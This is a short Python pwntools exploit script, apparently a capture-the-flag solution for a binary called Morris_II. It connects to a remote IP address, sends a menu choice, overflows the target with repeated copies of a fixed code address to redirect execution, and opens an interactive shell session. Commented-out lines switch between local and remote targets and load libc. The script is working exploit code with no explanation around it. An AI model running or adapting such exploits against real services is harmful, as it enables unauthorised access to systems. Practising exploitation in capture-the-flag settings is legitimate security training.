from pwn import *
import os
import sys
p=remote('43.143.254.94',10190)

# if len(sys.argv)==2 and sys.argv[1]=='r':
#     remote=1
#     p=remote('43.143.254.94',10114)
#     libc=ELF('./libc.so.6')
# else:
#     if len(sys.argv)==2 and sys.argv[1]=='n':
#         remote=-1
#     else:
#         remote=0
#     p=process('./Morris_II')
#     libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
# p.sendline(b'1')
# p.sendline(b'1')
# p.sendline(b'1')
# p.sendline(b'1')
p.sendline(b'0')
payload=p64(0x40123E)*0x10
p.sendline(payload)
p.interactive()